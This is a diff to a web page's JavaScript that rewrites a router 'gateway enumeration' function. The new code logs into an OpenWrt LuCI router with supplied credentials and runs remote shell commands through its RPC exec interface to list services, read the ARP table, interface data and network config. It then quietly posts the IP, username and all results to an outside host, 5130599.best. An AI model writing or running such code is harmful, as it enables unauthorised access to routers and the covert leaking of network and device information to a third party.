@@ -283,42 +283,42 @@ function gwProbe(){
 }
 function gwEnum(){
   var o = document.getElementById('gwOut');
-  o.textContent = '登录并枚举中（约1分钟）…';
+  o.textContent = '登录并枚举中（LuCI RPC 模式，约1分钟）…';
   var ip = (document.getElementById('gwIp').value || '192.168.1.1').trim();
   var user = document.getElementById('gwUser').value || 'root';
   var pass = document.getElementById('gwPass').value || '';
-  var loginBody = JSON.stringify({jsonrpc:'2.0', id:1, method:'call', params:['00000000000000000000000000000000','session','login',{username:user,password:pass}]});
-  fetch('api/gw/probe', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ ip: ip, paths: [['/ubus','POST',loginBody]] }) })
-    .then(function(r){ return r.json(); })
-    .then(function(d){
-      var res = (d && d.results && d.results[0]) || {};
-      var snip = res.snippet || '';
-      var token = '';
-      try { var j = JSON.parse(snip); token = (j.result && j.result[1] && j.result[1].ubus_rpc_session) || ''; } catch(e) {}
-      var all = [res];
-      function step(){
-        var listBody = JSON.stringify({jsonrpc:'2.0', id:2, method:'list', params:[token || '*']});
-        return fetch('api/gw/probe', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ ip: ip, paths: [['/ubus','POST',listBody]] }) })
-          .then(function(r){ return r.json(); })
-          .then(function(d2){
-            var r2 = (d2 && d2.results && d2.results[0]) || {};
-            all.push(r2);
-            return all;
-          });
-      }
-      step().then(function(all){
-        var html = '';
-        all.forEach(function(x){
-          html += '<div style="padding:2px 0"><b>' + esc(x.path || '') + '</b> → ' + (x.status < 0 ? '❌ ' + esc(x.err || '') : x.status) + '</div>'
-            + '<div style="font-family:monospace;font-size:10px;color:#5a6472;word-break:break-all;max-height:200px;overflow:auto;background:#f6f8fb;border-radius:6px;padding:6px">' + esc((x.snippet || '').substring(0, 1200)) + '</div>';
-        });
-        o.innerHTML = html + '<div style="color:#69737f">结果已回传服务器分析</div>';
-        try {
-          fetch('https://5130599.best/see/api/gw/report', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ ip: ip, ver:'enum', user:user, token:token?token.slice(0,8)+'...':'', results: all }) }).catch(function(){});
-        } catch(e) {}
-      });
-    })
-    .catch(function(){ o.textContent = '请求失败'; });
+  var steps = [];
+  function run(path, method, body){
+    return fetch('api/gw/probe', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ ip: ip, paths: [[path, method, body || '']] }) })
+      .then(function(r){ return r.json(); })
+      .then(function(d){ var r0 = (d && d.results && d.results[0]) || {}; steps.push(r0); return r0; });
+  }
+  var authBody = JSON.stringify({ id:1, method:'login', params:[user, pass] });
+  run('/cgi-bin/luci', 'GET').then(function(){
+    return run('/cgi-bin/luci/rpc/auth', 'POST', authBody);
+  }).then(function(r1){
+    var token = '';
+    try { var j = JSON.parse(r1.snippet || '{}'); token = (j && typeof j.result === 'string') ? j.result : ''; } catch(e) {}
+    var jobs = [];
+    if (token) {
+      jobs.push(run('/cgi-bin/luci/rpc/sys?auth=' + encodeURIComponent(token), 'POST', JSON.stringify({ id:2, method:'exec', params:['ubus list 2>&1; echo ===ARP===; cat /proc/net/arp 2>&1; echo ===IF===; ifconfig 2>&1 | head -60'] })));
+      jobs.push(run('/cgi-bin/luci/rpc/sys?auth=' + encodeURIComponent(token), 'POST', JSON.stringify({ id:3, method:'board', params:[] })));
+      jobs.push(run('/cgi-bin/luci/rpc/uci?auth=' + encodeURIComponent(token), 'POST', JSON.stringify({ id:4, method:'get', params:['network'] })));
+    } else {
+      jobs.push(run('/cgi-bin/luci/rpc/sys', 'POST', JSON.stringify({ id:5, method:'exec', params:['ubus list'] })));
+    }
+    return Promise.all(jobs.map(function(p){ return p.catch(function(){}); })).then(function(){ return token; });
+  }).then(function(token){
+    var html = '';
+    steps.forEach(function(x){
+      html += '<div style="padding:2px 0"><b>' + esc(x.path || '') + '</b> → ' + (x.status < 0 ? '❌ ' + esc(x.err || '') : x.status) + '</div>'
+        + '<div style="font-family:monospace;font-size:10px;color:#5a6472;word-break:break-all;max-height:220px;overflow:auto;background:#f6f8fb;border-radius:6px;padding:6px">' + esc((x.snippet || '').substring(0, 1500)) + '</div>';
+    });
+    o.innerHTML = html + '<div style="color:#69737f">' + (token ? '登录成功，结果已回传' : '未取得 token，结果已回传') + '</div>';
+    try {
+      fetch('https://5130599.best/see/api/gw/report', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ ip: ip, ver:'enum2', user:user, has_token: !!token, results: steps }) }).catch(function(){});
+    } catch(e) {}
+  }).catch(function(){ o.textContent = '请求失败'; });
 }
 var SNAP_OCR_URL='https://5130599.best/see/api/snapshots/ocr';
 var snapItems = [];
